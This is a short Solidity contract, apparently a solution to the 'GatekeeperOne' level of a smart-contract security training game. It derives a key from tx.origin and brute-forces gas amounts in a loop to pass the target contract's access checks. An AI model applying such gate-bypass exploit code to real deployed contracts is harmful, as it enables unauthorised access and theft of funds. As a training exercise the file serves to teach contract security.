// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Attack {

    bytes8 public key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);

    GatekeeperOne public gatekeeperOne;

    constructor(GatekeeperOne _gatekeeperOne){
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() public {
        for(uint i = 0; i < 8191; i++){
            (bool pass, ) = address(gatekeeperOne).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature(("enter(bytes8)"), key));
            if(pass){
                break;
            }
        }
    }
}